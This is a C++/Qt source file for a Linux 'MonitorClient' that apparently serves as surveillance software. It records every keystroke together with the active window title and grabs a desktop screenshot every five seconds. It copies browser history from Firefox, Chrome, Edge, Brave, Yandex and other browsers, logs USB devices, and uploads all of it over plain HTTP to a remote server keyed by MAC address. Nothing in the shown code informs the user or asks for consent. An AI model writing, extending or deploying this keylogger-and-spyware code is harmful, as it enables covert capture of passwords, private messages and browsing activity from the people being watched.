#include <QtCore/QDebug>
#include <QtCore/QDateTime>
#include <QtCore/QDir>
#include <QtCore/QProcess>
#include <QtCore/QSettings>
#include <QtCore/QUuid>
#include <QtCore/QStandardPaths>
#include <QtCore/QMutex>
#include <QtCore/QEventLoop>
#include <QtCore/QTimeZone>
#include <QtCore/QStorageInfo>

#include <QtGui/QScreen>
#include <QtGui/QPixmap>

#include <QtWidgets/QDesktopWidget>

#include <QtNetwork/QNetworkAccessManager>
#include <QtNetwork/QNetworkReply>
#include <QtNetwork/QHttpPart>

#include <QtDBus/QDBusInterface>
#include <QtDBus/QDBusReply>
#include <QtDBus/QDBusConnection>

#include <QtSql/QSqlDatabase>
#include <QtSql/QSqlQuery>
#include <QtSql/QSqlError>

#include <QtNetwork/QNetworkInterface>

#include "utils/desktopinfo.h"
#include "MonitorClient.h"
#include "functions.h"
#include "KeyboardMonitor.h"
#include <libudev.h>

#define SCREEN_INTERVAL 5
#define TIC_INTERVAL 30
#define HISTORY_INTERVAL 120
#define KEY_INTERVAL 60
#define STORAGE_CHECK_INTERVAL 5

MonitorClient::MonitorClient()
{
    macAddress = getMacAddress();
    screenInterval = SCREEN_INTERVAL;
    lastBrowserTic = -1;
    // Initialize keyboard monitor
    keyboardMonitor = new KeyboardMonitor(this);
    connect(keyboardMonitor, &KeyboardMonitor::keyPressed, this, &MonitorClient::handleKeyPress);
    connect(this, &MonitorClient::usbEvent, keyboardMonitor, &KeyboardMonitor::handleUsbEvent);
    
    // Connect signals to their respective slots
    connect(this, &MonitorClient::screen, this, &MonitorClient::getScreen);
    connect(this, &MonitorClient::tic, this, &MonitorClient::sendTic);
    connect(this, &MonitorClient::browserHistory, this, &MonitorClient::sendBrowserHistories);
    connect(this, &MonitorClient::keyLog, this, &MonitorClient::sendKeyLogs);
    connect(this, &MonitorClient::usbLog, this, &MonitorClient::sendUSBLogs);
    
    if (!keyboardMonitor->startMonitoring()) {
        qDebug() << "Failed to start keyboard monitoring";
    }

    // Initialize storage monitoring
    getStorageDevices();

    // Initialize USB monitoring
    setupUsbMonitoring();
}

MonitorClient::~MonitorClient()
{
    if (keyboardMonitor) {
        keyboardMonitor->stopMonitoring();
        delete keyboardMonitor;
        keyboardMonitor = nullptr;
    }
    cleanupUsbMonitoring();
}

QString MonitorClient::getMacAddress() {
    QString mac;
    
    QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    
    for (const QNetworkInterface& interface : interfaces) {
        // Skip loopback and down interfaces
        if (interface.flags().testFlag(QNetworkInterface::IsLoopBack) ||
            !interface.flags().testFlag(QNetworkInterface::IsUp) ||
            !interface.flags().testFlag(QNetworkInterface::IsRunning)) {
            continue;
        }
        
        // Get the first valid MAC address
        if (!interface.hardwareAddress().isEmpty()) {
            mac = interface.hardwareAddress();
            break;
        }
    }
    
    return mac;
}

void MonitorClient::setupUsbMonitoring()
{
    udev = udev_new();
    if (!udev) {
        qDebug() << "Failed to create udev context";
        return;
    }

    monitor = udev_monitor_new_from_netlink(udev, "udev");
    if (!monitor) {
        qDebug() << "Failed to create udev monitor";
        udev_unref(udev);
        return;
    }

    // Filter for USB devices
    udev_monitor_filter_add_match_subsystem_devtype(monitor, "usb", "usb_device");
    udev_monitor_enable_receiving(monitor);
    udevFd = udev_monitor_get_fd(monitor);
}

void MonitorClient::cleanupUsbMonitoring()
{
    if (monitor) {
        udev_monitor_unref(monitor);
        monitor = nullptr;
    }
    if (udev) {
        udev_unref(udev);
        udev = nullptr;
    }
}

QString MonitorClient::getDeviceInfo(struct udev_device* dev)
{
    if (!dev) return QString();

    const char* vendor = udev_device_get_sysattr_value(dev, "idVendor");
    const char* product_name = udev_device_get_sysattr_value(dev, "product");

    return QString("%1 (VID: %2)")
        .arg(product_name ? product_name : "unknown")
        .arg(vendor ? vendor : "unknown");
}

void MonitorClient::processUsbEvent(struct udev_device* dev)
{
    if (!dev) return;

    const char* action = udev_device_get_action(dev);
    if (!action) return;

    const char* syspath = udev_device_get_syspath(dev);
    if (!syspath) return;

    QString deviceInfo;
    QString timestamp = QDateTime::currentDateTime().toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");

    if (strcmp(action, "add") == 0) {
        deviceInfo = getDeviceInfo(dev);
        usbDeviceInfo[syspath] = deviceInfo;  // Store device info
        QJsonObject entryObj;
        entryObj["date"] = timestamp;
        entryObj["device"] = "Connected: " + deviceInfo;
        usbLogs.append(entryObj);
        emit usbEvent();
    } else if (strcmp(action, "remove") == 0) {
        deviceInfo = usbDeviceInfo.value(syspath, "Unknown Device");  // Get stored info
        usbDeviceInfo.remove(syspath);  // Remove from map
        QJsonObject entryObj;
        entryObj["date"] = timestamp;
        entryObj["device"] = "Disconnected: " + deviceInfo;
        usbLogs.append(entryObj);
        emit usbEvent();
    }
}

void MonitorClient::handleUsbEvent()
{
    if (!monitor) return;

    struct udev_device* dev = udev_monitor_receive_device(monitor);
    if (dev) {
        processUsbEvent(dev);
        udev_device_unref(dev);
    }
}

void MonitorClient::handleKeyPress(const QString &timestamp, const QString &windowTitle, const QString &keyText)
{
    QJsonObject entryObj;
    entryObj["date"] = timestamp;
    entryObj["application"] = windowTitle;
    entryObj["key"] = keyText;
    keyLogs.append(entryObj);
}

int MonitorClient::getScreen()
{
    QString savedPath = "/tmp/";
    QString filePath = "";
    int sendResult = 0;

    QDateTime currentTime = currentTime.currentDateTime();
    filePath = savedPath + currentTime.toString("yyyy-MM-dd_HH.mm.ss");
    bool res;
    grabScreen(filePath, res);

    if (res) 
    {
        filePath.append(".jpg");
        sendResult = sendScreens(filePath);
        if (sendResult < 0) {
            return 0;
        }
        
        QDir dir;
        dir.remove(filePath);
    }
    
    return sendResult;
}

void MonitorClient::grabEntireDesktop(QString path, QPixmap& res, bool& ok)
{
    QDBusConnection connection = QDBusConnection::sessionBus();
    connection.registerService("org.gnome.Screenshot");
    QDBusInterface gnomeInterface(
        QStringLiteral("org.gnome.Shell"),
        QStringLiteral("/org/gnome/Shell/Screenshot"),
        QStringLiteral("org.gnome.Shell.Screenshot"),
        connection);
    QDBusReply<bool> reply = gnomeInterface.call(
        QStringLiteral("Screenshot"), false, false, path);
    if (reply.value()) {
        res = QPixmap(path);
        QFile dbusResult(path);
        dbusResult.remove();
    } else {
        ok = false;
    }
    connection.unregisterService("org.gnome.Screenshot");
}

void MonitorClient::grabScreen(QString filePath, bool& ok)
{
    QPixmap p;
    grabEntireDesktop(filePath + ".png", p, ok);
    if (ok) {
        p.save(filePath + ".jpg");
    }
}

int MonitorClient::sendScreens(QString filePath){

    int ret = -3;
    QEventLoop eventLoop;
    
    QString serverIP = getServerIP();

    if (!serverIP.isEmpty()) {
        QNetworkAccessManager mgr;
        QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));

        // the HTTP request
        QNetworkRequest req(QUrl(serverIP.prepend("http://").append("/scview/webapi.php")));
        QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

        QHttpPart imagePart;
        imagePart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("image/jpeg"));
        imagePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("multipart/form-data; name=\"fileToUpload\"; filename=\""+filePath+"\""));
        imagePart.setRawHeader("Content-Transfer-Encoding","binary");
        QFile *file = new QFile(filePath);
        file->open(QIODevice::ReadOnly);
        imagePart.setBodyDevice(file);
        file->setParent(multiPart); // we cannot delete the file now, so delete it with the multiPart

        multiPart->append(imagePart);
        
        QNetworkReply *reply = mgr.post(req, multiPart);
        
        
        multiPart->setParent(reply); // delete the multiPart with the reply    
        eventLoop.exec(); // blocks stack until "finished()" has been called
        
        if (reply->error() == QNetworkReply::NoError) {
            QJsonParseError jsonError;
            QJsonDocument jsonDoc = QJsonDocument::fromJson(reply->readAll(),&jsonError);
            if (jsonError.error != QJsonParseError::NoError) {
                qDebug() << jsonError.errorString();
                ret = -2; // server error;
            }
            if(jsonDoc.isObject())
            {
                QJsonObject obj = jsonDoc.object();
                
                qDebug() << jsonDoc.object();
                
                QJsonObject::iterator itr = obj.find("Status");
                if(itr != obj.end())
                {
                    if(obj.value("Status").toString() == "OK")
                    {
                        ret = obj.value("Interval").toInt();
                    }
                    else 
                    {
                        qDebug() << obj.value("Message").toString();
                        ret = -1; //Tic is bad
                    }
                }
            }
            
            delete reply;
        }
        else {
            //failure
            qDebug() << "Failure" <<reply->errorString();
            delete reply;
        }
        
        return ret;
    }
    return ret;
}
int MonitorClient::sendTic(){

    int ret = -3;
    
    QString serverIP = getServerIP();
    
    if (!serverIP.isEmpty()) {
        
        // create custom temporary event loop on stack
        QEventLoop eventLoop;

        // "quit()" the event-loop, when the network request "finished()"
        QNetworkAccessManager mgr;
        QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));

        // the HTTP request
        QNetworkRequest req(QUrl(serverIP.prepend("http://").append("/scview/eventhandler.php")));
        QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

        QHttpPart eventPart;
        eventPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"Event\""));
        eventPart.setBody("Tic");
        
        QHttpPart versionPart;
        versionPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"Version\""));
        versionPart.setBody(MONITORAPP_VERSION);

        QHttpPart macAddressPart;
        macAddressPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"MacAddress\""));
        macAddressPart.setBody(macAddress.toUtf8());

        multiPart->append(eventPart);
        multiPart->append(versionPart);
        multiPart->append(macAddressPart);

        QNetworkReply *reply = mgr.post(req, multiPart);
        eventLoop.exec(); // blocks stack until "finished()" has been called

        if (reply->error() == QNetworkReply::NoError) {
            QJsonParseError jsonError;
            QJsonDocument jsonDoc = QJsonDocument::fromJson(reply->readAll(),&jsonError);
            if (jsonError.error != QJsonParseError::NoError) {
                qDebug() << jsonError.errorString();
                ret = -2; // server error;
            }
            if(jsonDoc.isObject())
            {
                QJsonObject obj = jsonDoc.object();
                QJsonObject::iterator itr = obj.find("Status");
                if(itr != obj.end())
                {
                    if(obj.value("Status").toString() == "OK")
                    {
                        ret = 1; // Tic Ok
                    }
                    else 
                    {
                        qDebug() << obj.value("Message").toString();
                        ret = -1; // Tic is bad
                    }
                }
                if (obj.contains("LastBrowserTic")) {
                    lastBrowserTic = obj["LastBrowserTic"].toVariant().toLongLong();
                }
            }
            
            delete reply;
        }
        else {
            //failure
            qDebug() << "Failure" <<reply->errorString();
            delete reply;
        }
    }
    
    return ret;
}

void MonitorClient::queryBrowserHistory(const QString& dbPath, const QString& query, const QString& browserName) {
    if (!QFile::exists(dbPath)) {
        return;
    }
    
    // Copy the database file since it might be locked by the browser
    QString tempDbPath = QDir::temp().filePath(QUuid::createUuid().toString() + ".db");
    if (!QFile::copy(dbPath, tempDbPath)) {
        qDebug() << "Failed to copy browser database";
        return;
    }
    
    {
        QSqlDatabase db = QSqlDatabase::addDatabase("QSQLITE", "browser_history");
        db.setDatabaseName(tempDbPath);
        
        if (db.open()) {
            QSqlQuery sqlQuery(db);
            
            // Get the last check time from server
            qint64 lastCheck = getLastCheckedTime(browserName);
            QString fieldNameForVisitTime = getFieldNameForVisitTime(browserName);
            QString fullQuery = query + QString(" AND %1 > %2").arg(fieldNameForVisitTime).arg(lastCheck) + QString(" ORDER BY %1 ASC").arg(fieldNameForVisitTime);
            if (sqlQuery.exec(fullQuery)) {
                while (sqlQuery.next()) {
                    qint64 visitTime = sqlQuery.value("visit_time").toLongLong();
                    QString url = sqlQuery.value("url").toString();
                    QString visitDate = sqlQuery.value("last_visit_time").toString();
                    QJsonObject historyItem;
                    historyItem["date"] = visitDate;
                    historyItem["url"] = url;
                    browserHistories.append(historyItem);
                    if (lastCheck < visitTime) {
                        lastCheck = visitTime;
                    }
                }
                updateLastCheckedTime(browserName, lastCheck);
            } else {
                qDebug() << "Query failed:" << sqlQuery.lastError().text();
            }
            db.close();
        } else {
            qDebug() << "Failed to open database:" << db.lastError().text();
        }
    }
    
    QSqlDatabase::removeDatabase("browser_history");
    QFile::remove(tempDbPath);
    
}

QStringList MonitorClient::getMozBasedProfilePaths(const QString& browserPath) {
    QStringList profilePaths;
    
    // Traditional location
    QString firefoxPath = QDir::homePath() + browserPath;
    QDir dir(firefoxPath);
    QStringList filters;
    filters << "*.default-release" << "*.default-*" << "*.default" << "*.dev-edition-default" << "*.esr";
    QStringList profileDirs = dir.entryList(filters, QDir::Dirs);
    
    for (const QString& profileDir : profileDirs) {
        QString profilePath = firefoxPath + profileDir + "/places.sqlite";
        if (QFile::exists(profilePath)) {
            profilePaths.append(profilePath);
        }
    }

    // Check for additional profiles (Profile 1, Profile 2, etc.)
    QStringList additionalFilters;
    additionalFilters << "Profile*";
    QStringList additionalProfileDirs = dir.entryList(additionalFilters, QDir::Dirs);
    
    for (const QString& profileDir : additionalProfileDirs) {
        QString profilePath = firefoxPath + profileDir + "/places.sqlite";
        if (QFile::exists(profilePath)) {
            profilePaths.append(profilePath);
        }
    }

    QString snapPath;
    if (browserPath == "/.midori") {
        snapPath = QDir::homePath() + "/snap/midori/current/.config/midori/history.db";
        // Check Snap Midori location first
        if (QFile::exists(snapPath)) {
            profilePaths.append(snapPath);
        }
        // Fall back to traditional Midori location
        QString traditionalPath = QDir::homePath() + browserPath;
        if (QFile::exists(traditionalPath)) {
            profilePaths.append(traditionalPath);
        }
    } else {
        snapPath = QDir::homePath() + "/snap/firefox/common/.mozilla/firefox/";
        QDir snapDir(snapPath);
        QStringList snapFilters;
        snapFilters << "*.default" << "*.default-release" << "*.default-*" << "Profile*";
        QStringList snapProfileDirs = snapDir.entryList(snapFilters, QDir::Dirs);
        
        for (const QString& profileDir : snapProfileDirs) {
            QString profilePath = snapPath + profileDir + "/places.sqlite";
            if (QFile::exists(profilePath)) {
                profilePaths.append(profilePath);
            }
        }
    }

    return profilePaths;
}

QStringList MonitorClient::getChromiumBasedProfilePaths(const QString& browserPath) {
    QStringList profilePaths;
    QString path = QDir::homePath() + browserPath;
    QDir dir(path);
    
    if (dir.exists()) {
        // Get all profile directories
        QStringList profileDirs = dir.entryList(QDir::Dirs | QDir::NoDotAndDotDot);
        
        for (const QString& profileDir : profileDirs) {
            QString profilePath = path + "/" + profileDir + "/History";
            if (QFile::exists(profilePath)) {
                profilePaths.append(profilePath);
            }
        }
    }
    
    return profilePaths;
}

void MonitorClient::getFirefoxHistory() {
    QStringList profilePaths = getMozBasedProfilePaths("/.mozilla/firefox/");
    
    qDebug() << "Firefox history path:" << profilePaths;
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_date/1000000, 'unixepoch', '+10:00') as last_visit_time, p.url, h.visit_date as visit_time "
                           "FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id ";
            queryBrowserHistory(dbPath, query, "Firefox");
        }
    }
    
}

void MonitorClient::getChromeHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/google-chrome/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Chrome");
        }
    }
    
}

void MonitorClient::getEdgeHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/microsoft-edge/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Edge");
        }
    }
    
}

void MonitorClient::getOperaHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/opera/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Opera");
        }
    }
    
}

void MonitorClient::getBraveHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/BraveSoftware/Brave-Browser/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Brave");
        }
    }
    
}

void MonitorClient::getMidoriHistory() {
    QStringList profilePaths = getMozBasedProfilePaths("/.midori/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_date/1000000, 'unixepoch', '+10:00') as last_visit_time, p.url, h.visit_date as visit_time "
                           "FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id ";
            queryBrowserHistory(dbPath, query, "Midori");
        }
    }
    
}

void MonitorClient::getYandexHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/yandex-browser/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Yandex");
        }
    }
    
}

void MonitorClient::getSlimjetHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/slimjet/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Slimjet");
        }
    }
    
}

void MonitorClient::getFalkonHistory() {
    QStringList profilePaths;
    QString falkonBasePath = QDir::homePath() + "/.config/falkon/profiles/";
    QDir falkonDir(falkonBasePath);
    
    if (falkonDir.exists()) {
        QStringList profileDirs = falkonDir.entryList(QDir::Dirs | QDir::NoDotAndDotDot);
        for (const QString& profileDir : profileDirs) {
            QString profilePath = falkonBasePath + profileDir + "/browsedata.db";
            if (QFile::exists(profilePath)) {
                profilePaths.append(profilePath);
            }
        }
    }
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(date/1000, 'unixepoch', '+10:00') as last_visit_time, url, date as visit_time "
                           "FROM history WHERE id > 0";
            queryBrowserHistory(dbPath, query, "Falkon");
        }
    }
    
}

void MonitorClient::getBrowserHistory() {
    // Get Firefox history
    getFirefoxHistory();
    
    // Get Chrome history
    getChromeHistory();
    
    // Get Edge history
    getEdgeHistory();
    
    // Get Opera history
    getOperaHistory();
    
    // Get Brave history
    getBraveHistory();
    
    // Get Falkon history
    getFalkonHistory();
    
    // Get Midori history
    getMidoriHistory();
    
    // Get Yandex history
    getYandexHistory();
    
    // Get Slimjet history
    getSlimjetHistory();
    
    // Get Vivaldi history
    getVivaldiHistory();
}

QString MonitorClient::getJsonObjectListAsJsonString(const QList<QJsonObject>& jsonObjectList) {
    QJsonArray jsonArray;
    for (const QJsonObject& obj : jsonObjectList) {
        jsonArray.append(obj);
    }
    
    QJsonDocument doc(jsonArray);
    return doc.toJson(QJsonDocument::Compact);
}

int MonitorClient::sendBrowserHistories() {
    int ret = -3;
    QString serverIP = getServerIP();
    
    if (!serverIP.isEmpty()) {
        // Get browser histories
        getBrowserHistory();
        
        if (!browserHistories.isEmpty()) {
            QString browserHistoriesJsonString = getJsonObjectListAsJsonString(browserHistories);
            qDebug() << "Browser histories:" << browserHistoriesJsonString;

            qDebug() << "Sending browser histories in chunks...";
            
            // Split into chunks of 1000 entries
            QList<QList<QJsonObject>> chunks = chunkData(browserHistories, 1000);
            
            qDebug() << "Sending" << browserHistories << " browser history";
            qDebug() << "Sending" << chunks << "chunks of browser history";
            
            // Send each chunk
            for (int i = 0; i < chunks.size(); ++i) {
                qDebug() << "Sending chunk" << (i + 1) << "of" << chunks.size();
                QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
                ret = sendDataChunk(serverIP, "BrowserHistory", "BrowserHistories", chunkJsonString);
                
                if (ret != 1) {
                    qDebug() << "Failed to send browser history chunk" << (i + 1);
                    break;
                }
                
                // Small delay between chunks to avoid overwhelming the server
                QThread::msleep(100);
            }

            browserHistories.clear(); // Clear browser histories after sending
        } else {
            qDebug() << "No browser history to send";
            ret = 1; // Success (no data to send)
        }
    }
    
    return ret;
}

void MonitorClient::getStorageDevices()
{
    struct udev* udev = udev_new();
    if (!udev) {
        return;
    }

    struct udev_enumerate* enumerate = udev_enumerate_new(udev);
    udev_enumerate_add_match_subsystem(enumerate, "usb");
    udev_enumerate_scan_devices(enumerate);

    struct udev_list_entry* devices_list = udev_enumerate_get_list_entry(enumerate);
    struct udev_list_entry* entry;
    udev_list_entry_foreach(entry, devices_list) {
        const char* path = udev_list_entry_get_name(entry);
        struct udev_device* dev = udev_device_new_from_syspath(udev, path);
        
        if (dev) {
            if (udev_device_get_devtype(dev) && strcmp(udev_device_get_devtype(dev), "usb_device") == 0) {
                const char* syspath = udev_device_get_syspath(dev);
                if (syspath) {
                    QString deviceInfo = getDeviceInfo(dev);
                    usbDeviceInfo[syspath] = deviceInfo;  // Store device info
                    
                    QString timestamp = QDateTime::currentDateTime().toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");
                    QJsonObject entryObj;
                    entryObj["date"] = timestamp;
                    entryObj["device"] = "Connected: " + deviceInfo;
                    qDebug() << "Connected: " + deviceInfo;
                    usbLogs.append(entryObj);
                }
            }
            udev_device_unref(dev);
        }
    }
    
    udev_enumerate_unref(enumerate);
    udev_unref(udev);
}

void MonitorClient::run()
{
    qint64 lastTicTime = QDateTime::currentSecsSinceEpoch();
    qint64 lastScreenTime = lastTicTime;
    qint64 lastHistoryTime = lastTicTime;
    qint64 lastKeyLogTime = lastTicTime;
    
    while (!isInterruptionRequested()) {
        if (checkActiveScreen() > 0)
        {
            qint64 currentTime = QDateTime::currentSecsSinceEpoch();
            
            // Check for USB events
            if (udevFd >= 0) {
                fd_set fds;
                struct timeval tv;
                FD_ZERO(&fds);
                FD_SET(udevFd, &fds);
                tv.tv_sec = 0;
                tv.tv_usec = 0;

                if (select(udevFd + 1, &fds, NULL, NULL, &tv) > 0) {
                    handleUsbEvent();
                }
            }

            // Send image every screenInterval seconds
            if (currentTime - lastScreenTime >= screenInterval) {
                emit screen();
                lastScreenTime = currentTime;
            }

            // Send tic every TIC_INTERVAL seconds
            if (currentTime - lastTicTime >= TIC_INTERVAL) {
                emit tic();
                lastTicTime = currentTime;
            }
                    
            // Send tic every TIC_INTERVAL seconds
            if (currentTime - lastTicTime >= TIC_INTERVAL) {
                emit tic();
                lastTicTime = currentTime;
            }
            
            // Send browser histories every HISTORY_INTERVAL seconds
            if (currentTime - lastHistoryTime >= HISTORY_INTERVAL) {
                if (lastBrowserTic != -1) {
                    emit browserHistory();
                    lastHistoryTime = currentTime;
                }
            }
            
            // Send key logs every KEY_INTERVAL seconds
            if (currentTime - lastKeyLogTime >= KEY_INTERVAL) {
                emit keyLog();
                emit usbLog();
                lastKeyLogTime = currentTime;
            }
        }
        
        QThread::msleep(1000);  // Sleep for 1 second
    }
}

qint64 MonitorClient::convertUnixtimestampToBrowserTime(const QString& browserName, const qint64 unixtimestamp) {
    if (browserName == "Firefox" || browserName == "Midori") {
        // Convert Unix timestamp (seconds) to microseconds
        return unixtimestamp * 1000000;
    } else if (browserName == "Chrome" || browserName == "Edge" || browserName == "Opera" || 
               browserName == "Brave" || browserName == "Yandex" || browserName == "Slimjet" || 
               browserName == "Vivaldi") {
        // Chromium-based browsers use microseconds since Jan 1, 1601
        // First convert Unix timestamp to microseconds, then add microseconds from 1601 to 1970
        const qint64 WINDOWS_TO_UNIX_EPOCH = 11644473600LL; // Seconds between 1601 and 1970
        return (unixtimestamp + WINDOWS_TO_UNIX_EPOCH) * 1000000;
    } else if (browserName == "Falkon") {
        return unixtimestamp * 1000;
    }
    return unixtimestamp; // Default case
}

qint64 MonitorClient::getLastCheckedTime(const QString& browserName) {
    if (!lastCheckedTimes.contains(browserName)) {
        lastCheckedTimes[browserName] = convertUnixtimestampToBrowserTime(browserName, lastBrowserTic);
    }
    return lastCheckedTimes.value(browserName);
}

void MonitorClient::updateLastCheckedTime(const QString& browserName, const qint64 timestamp) {
    lastCheckedTimes[browserName] = timestamp;
}

QString MonitorClient::getFieldNameForVisitTime(const QString& browserName) {
    if (browserName == "Firefox" || browserName == "Midori") {
        return "visit_date";
    } else if (browserName == "Chrome" || browserName == "Edge" || browserName == "Opera" || 
               browserName == "Brave" || browserName == "Yandex" || browserName == "Slimjet" || 
               browserName == "Vivaldi") {
        return "visit_time";
    }
    return "date";
}

int MonitorClient::sendKeyLogs()
{
    int ret = -3;
    if (!keyLogs.isEmpty()) {
        qDebug() << "Sending key logs in chunks...";
        
        QString serverIP = getServerIP();
        
        if (!serverIP.isEmpty()) {
            // Split into chunks of 1000 entries
            QList<QList<QJsonObject>> chunks = chunkData(keyLogs, 1000);
            
            qDebug() << "Sending" << chunks.size() << "chunks of key logs";
            
            // Send each chunk
            for (int i = 0; i < chunks.size(); ++i) {
                qDebug() << "Sending key log chunk" << (i + 1) << "of" << chunks.size();
                QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
                ret = sendDataChunk(serverIP, "KeyLog", "KeyLogs", chunkJsonString);
                
                if (ret != 1) {
                    qDebug() << "Failed to send key log chunk" << (i + 1);
                    break;
                }
                
                // Small delay between chunks to avoid overwhelming the server
                QThread::msleep(100);
            }
            
            keyLogs.clear();  // Clear logs after sending
        }
    } else {
        qDebug() << "No key logs to send";
        ret = 1; // Success (no data to send)
    }
    return ret;
}

int MonitorClient::sendUSBLogs()
{
    int ret = -3;
    if (!usbLogs.isEmpty()) {
        qDebug() << "Sending USB logs in chunks...";
        
        QString serverIP = getServerIP();
        
        if (!serverIP.isEmpty()) {
            // Split into chunks of 1000 entries
            QList<QList<QJsonObject>> chunks = chunkData(usbLogs, 1000);
            
            qDebug() << "Sending" << chunks.size() << "chunks of USB logs";
            
            // Send each chunk
            for (int i = 0; i < chunks.size(); ++i) {
                qDebug() << "Sending USB log chunk" << (i + 1) << "of" << chunks.size();
                QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
                ret = sendDataChunk(serverIP, "USBLog", "USBLogs", chunkJsonString);
                
                if (ret != 1) {
                    qDebug() << "Failed to send USB log chunk" << (i + 1);
                    break;
                }
                
                // Small delay between chunks to avoid overwhelming the server
                QThread::msleep(100);
            }
            
            usbLogs.clear();  // Clear logs after sending
        }
    } else {
        qDebug() << "No USB logs to send";
        ret = 1; // Success (no data to send)
    }
    return ret;
}

void MonitorClient::getVivaldiHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/vivaldi/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Vivaldi");
        }
    }
}

QList<QList<QJsonObject>> MonitorClient::chunkData(const QList<QJsonObject>& data, int chunkSize) {
    QList<QList<QJsonObject>> chunks;
    for (int i = 0; i < data.size(); i += chunkSize) {
        QList<QJsonObject> chunk;
        for (int j = i; j < i + chunkSize && j < data.size(); j++) {
            chunk.append(data[j]);
        }
        chunks.append(chunk);
    }
    return chunks;
}

int MonitorClient::sendDataChunk(const QString& serverIP, const QString& eventType, const QString& dataField, const QString& data) {
    QEventLoop eventLoop;
    QNetworkAccessManager mgr;
    QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));

    QString url = "http://" + serverIP + "/scview/eventhandler.php";
    QNetworkRequest req;
    req.setUrl(QUrl(url));
    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    
    // Create JSON object
    QJsonObject jsonObj;
    jsonObj["MacAddress"] = macAddress;
    jsonObj["Event"] = eventType;
    jsonObj["Version"] = QString(MONITORAPP_VERSION);
    jsonObj[dataField] = data;  // Direct assignment of QJsonArray
    
    QJsonDocument jsonDoc(jsonObj);
    QByteArray jsonData = jsonDoc.toJson();
    
    QNetworkReply *reply = mgr.post(req, jsonData);
    eventLoop.exec();

    int ret = -3;
    if (reply->error() == QNetworkReply::NoError) {
        QJsonParseError jsonError;
        QJsonDocument responseDoc = QJsonDocument::fromJson(reply->readAll(), &jsonError);
        if (jsonError.error != QJsonParseError::NoError) {
            qDebug() << jsonError.errorString();
            ret = -2; // server error
        }
        if (responseDoc.isObject()) {
            QJsonObject obj = responseDoc.object();
            QJsonObject::iterator itr = obj.find("Status");
            if (itr != obj.end()) {
                if (obj.value("Status").toString() == "OK") {
                    ret = 1; // Success
                } else {
                    qDebug() << obj.value("Message").toString();
                    ret = -1; // Bad response
                }
            }
        }
    } else {
        qDebug() << "Failure" << reply->errorString();
    }
    
    delete reply;
    return ret;
}
